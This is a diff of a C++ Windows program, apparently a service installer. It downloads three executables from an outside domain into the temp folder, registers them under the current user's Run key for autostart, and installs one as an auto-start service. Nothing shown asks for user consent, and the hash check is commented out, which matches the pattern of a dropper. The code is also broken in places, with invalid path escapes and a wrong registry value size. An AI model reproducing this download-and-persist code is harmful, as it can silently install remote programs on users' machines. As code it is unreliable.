@@ -1,17 +1,19 @@
 #include "stdafx.h"
 #include <iostream>
 #include "windows.h"
-#include <wininet.h>
-#include <fstream>
-#include <atlstr.h>
+#include <wininet.h> //MayBeLater
+#include <fstream> //MayBeLater
+#include <atlstr.h> //MayBeLater
 #include <urlmon.h>
-#include <Wincrypt.h>
+#include <tlhelp32.h>
+#include <Wincrypt.h> //MayBeLater
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"wininet")
 
-#define BUFSIZE 1024
-#define MD5LEN  16
+//#define BUFSIZE 1024
+//#define MD5LEN  16
 
+#pragma region MayBeNeededLater/*
 //Определение битности. Взял кусок кода отсюда: https://support.microsoft.com/en-gb/kb/2060044
 #pragma region Is64BitOperatingSystem()
 //   FUNCTION: DoesWin32MethodExist(PCWSTR, PCSTR)
@@ -74,13 +76,13 @@ std::string readHashFromFile(const char* filepath)
 			std::cout << chh << "lol";
 		system("pause");
 	}
-	/*for (int i = 0; i < 32; ++i)
+	for (int i = 0; i < 32; ++i)
 	{
 
 		res[i] = txtfile.get();
 		std::cout << res[i] << " " << txtfile.get();
 		system("pause"); 
-	}*/
+	}
 	return res;
 }
 
@@ -126,6 +128,12 @@ int GetService()
 				if (bSend) {
 					// создаём выходной файл
 					std::ofstream fnews("serviceapp.txt", std::ios::out | std::ios::binary);
+					BOOL urlread = FALSE;
+					//char* servExeBuf = new char[1024];
+					//char* servExeUrl;
+					//int urlLength;
+					//std::wstring url = L"";
+					std::wstring urlReading = L"";
 					if (fnews.is_open()) for (;;) {
 						// читаем данные
 						char  szData[1024];
@@ -134,14 +142,39 @@ int GetService()
 						// выход из цикла при ошибке или завершении
 						if (bRead == FALSE || dwBytesRead == 0)
 							break;
-
+						if (urlread == FALSE)
+						{
+							int i = 33;
+							while (szData[i] != '\n')
+							{
+								urlReading.append(1, szData[i]);
+								++i;
+							}
+							//servExeBuf[i - 33] = '\0';
+							urlread = TRUE;
+							//urlLength = i - 32;
+						}
+						
 						// сохраняем результат
 						szData[dwBytesRead] = 0;
 						fnews << szData;
 					}
-					std::string hash = readHashFromFile("serviceapp.txt");
-					system("pause");
-					HRESULT hr = URLDownloadToFile(NULL, _T("https://rananyev.ru/iuservice/files/mainservice.exe"), _T("iuservice.exe"), 0, NULL); // ссылку из файла выдрать
+					//servExeUrl = new char[urlLength];
+					//for (int i = 0; i < urlLength; ++i)
+						//servExeUrl[i] = servExeBuf[i];
+					//std::cout << urlLength << "\t"<< servExeBuf;
+					//system("pause");
+					//std::cout << servExeUrl;
+					//system("pause");
+					//delete[]servExeBuf;
+					//std::string hash = readHashFromFile("serviceapp.txt");
+					//system("pause");
+					//url += L"servExeUrl";
+					const wchar_t* url = urlReading.c_str();
+					std::cout << url;//<< IsValidURL(NULL, (LPCTSTR)url, 0);
+					HRESULT hr = URLDownloadToFile(NULL, (LPCTSTR)url, _T("iuservice.exe"), 0, NULL); // ссылку из файла выдрать
+					//std::cout << hr;
+					//delete[]servExeUrl;
 				}
 				else { std::cout << "req" << std::endl; std::cout << GetLastError(); }
 				// закрываем запрос
@@ -157,40 +190,6 @@ int GetService()
 	}
 
 	return 0;
-}
-
-//Установка и запуск сервиса
-BOOL InstallAndStartService(const CString& strServiceName, const CString& strDisplayName, const CString& strBinaryPathName)
-{
-	BOOL bResult = FALSE;
-
-	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-	if (NULL != hServiceControlManager)
-	{
-		SC_HANDLE hService = CreateService(hServiceControlManager,
-			(LPCTSTR)strServiceName,
-			(LPCTSTR)strDisplayName,
-			SC_MANAGER_ALL_ACCESS,
-			SERVICE_WIN32_OWN_PROCESS,
-			SERVICE_AUTO_START,
-			SERVICE_ERROR_NORMAL,
-			(LPCTSTR)strBinaryPathName,
-			0,
-			0,
-			0,
-			0,
-			0);
-		if (hService != NULL)
-		{
-			StartService(hService, NULL, NULL);
-			bResult = TRUE;
-			CloseServiceHandle(hService);
-		}
-
-		CloseServiceHandle(hServiceControlManager);
-	}
-
-	return bResult;
 }
 
 //md5 файла
@@ -304,22 +303,126 @@ std::string Filemd5(const CString& nameOfFile)
 	return resmd5;
 }
 
+bool ProcessRunning(const WCHAR* name)
+{
+	HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	if (SnapShot == INVALID_HANDLE_VALUE)
+		return false;
+
+	PROCESSENTRY32 procEntry;
+	procEntry.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(SnapShot, &procEntry))
+		return false;
+
+	do
+	{
+		if (wcscmp(procEntry.szExeFile, name) == 0)
+			return true;
+	} while (Process32Next(SnapShot, &procEntry));
+
+	return false;
+}
+*/
+#pragma endregion
+
+//Установка и запуск сервиса
+BOOL InstallAndStartService(const CString& strServiceName, const CString& strDisplayName, const CString& strBinaryPathName)
+{
+	BOOL bResult = FALSE;
+
+	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (NULL != hServiceControlManager)
+	{
+		SC_HANDLE hService = CreateService(hServiceControlManager,
+			(LPCTSTR)strServiceName,
+			(LPCTSTR)strDisplayName,
+			SC_MANAGER_ALL_ACCESS,
+			SERVICE_WIN32_OWN_PROCESS,
+			SERVICE_AUTO_START,
+			SERVICE_ERROR_NORMAL,
+			(LPCTSTR)strBinaryPathName,
+			0,
+			0,
+			0,
+			0,
+			0);
+		if (hService != NULL)
+		{
+			StartService(hService, NULL, NULL);
+			bResult = TRUE;
+			CloseServiceHandle(hService);
+		}
+
+		CloseServiceHandle(hServiceControlManager);
+	}
+
+	return bResult;
+}
+
+BOOL StopAndDeleteService(const CString& strServiceName)
+{
+	BOOL bResult = FALSE;
+
+	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (NULL != hServiceControlManager)
+	{
+		SC_HANDLE hService = OpenService(hServiceControlManager, (LPCTSTR)strServiceName, SC_MANAGER_ALL_ACCESS);
+		if (hService != NULL)
+		{
+			ControlService(hService, SERVICE_CONTROL_STOP, NULL);
+			DeleteService(hService);
+			bResult = TRUE;
+			CloseServiceHandle(hService);
+		}
+
+		CloseServiceHandle(hServiceControlManager);
+	}
+
+	return bResult;
+}
+
 int _tmain(int argc, _TCHAR* argv[])
 {
-	int bitVer;
-	//Is64BitOperatingSystem() ? bitVer = 64 : bitVer = 32;
-	GetService();
-	int timeout = 0;
-	while (Filemd5("iuservice.exe") != "c1c68651b5f5270361c84562be67af2e") //не тот хэш, надо бы из файла прочесть
-	{
-		++timeout;
-		if (timeout == 100000)
-		{
-			std::cout << "Your connection is bad";
-			break;
-		}
-	}
-	InstallAndStartService("IUservice", "IUservice", "iuservice.exe");
-	system("pause");
+	StopAndDeleteService("IUservice");
+	TCHAR szPath[MAX_PATH];
+	GetModuleFileName(NULL, szPath, MAX_PATH);
+	HKEY newValue;
+	//CreateDirectory(_T("C:\\Program Files\\IUservice"), NULL);
+	TCHAR szTempPathBuffer[MAX_PATH];
+	GetTempPath(MAX_PATH, szTempPathBuffer);
+	RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newValue);
+	RegSetValueEx(newValue, _T("Iservice"), 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
+	std::wstring filePath = szTempPathBuffer;
+	filePath += L"\iuservice.exe";
+	HRESULT hr1 = URLDownloadToFile(NULL, _T("https://rananyev.ru/iuservice/files/iuservice.exe"), filePath.c_str(), 0, NULL);
+	// Здесь прописать урл файлов и под каким именем их сохранять
+	filePath = szTempPathBuffer;
+	filePath += L"\hello_word.exe";
+	HRESULT hr2 = URLDownloadToFile(NULL, _T("https://rananyev.ru/iuservice/files/hello_word.exe"), filePath.c_str(), 0, NULL);
+	RegSetValueEx(newValue, _T("hello_word"), 0, REG_SZ, (LPBYTE)filePath.c_str(), sizeof(LPBYTE)*filePath.size());
+	filePath = szTempPathBuffer;
+	filePath += L"\empty.exe";
+	HRESULT hr3 = URLDownloadToFile(NULL, _T("https://rananyev.ru/iuservice/files/empty.exe"), filePath.c_str(), 0, NULL);
+	RegSetValueEx(newValue, _T("empty"), 0, REG_SZ, (LPBYTE)filePath.c_str(), sizeof(LPBYTE)*filePath.size());
+	RegCloseKey(newValue);
+
+	filePath = szTempPathBuffer;
+	filePath += L"\iuservice.exe";
+	std::string str1(filePath.begin(), filePath.end());
+	InstallAndStartService("IUservice", "IUservice", str1.c_str());
+	
+
+	//HKEY new123Value;
+	//WCHAR proc[MAX_PATH];
+	//DWORD a = 8192;
+	//RegOpenKey(HKEY_LOCAL_MACHINE, _T("Hardware\\Description\\System\\CentralProcessor\\0\\"), &new123Value);
+	//RegGetValue(HKEY_LOCAL_MACHINE, _T("Hardware\Description\System\CentralProcessor\0"), _T("ProcessorNameString"), RRF_RT_ANY, NULL, proc, &a);
+	//std::wstring aaa = proc;
+	//std::string aa(aaa.begin(), aaa.end());
+	//std::cout << aa.c_str();
+	//Здесь сервис запустился, увидел, что процессов нет и запустил их
+	//system("pause");
 	return 0;
 }
